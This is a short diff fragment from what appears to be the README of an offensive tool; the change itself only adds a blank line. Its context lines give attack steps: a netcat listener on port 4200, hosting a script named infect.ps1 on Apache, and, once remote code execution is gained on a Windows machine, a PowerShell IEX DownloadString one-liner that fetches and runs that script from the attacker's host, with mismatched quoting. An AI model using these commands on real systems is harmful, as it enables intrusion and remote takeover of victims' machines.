@@ -14,6 +14,7 @@ rlwrap nc -lvnp 4200
 systemctl start apache2
 ```
 and moving the infect.ps1 file to `/var/www/html` if you are on a modern kali system
+
 4. Upon discovery of RCE in a windows system, execute the following command, replacing your attack box's ip with <RHOST>, and the path of the script on your locally hosted web server
 ```
 powershell -c 'IEX (New-Object System.Net.WebClient).DownloadString('http://<RHOST></some/path/infect.ps1>; infect <RHOST>
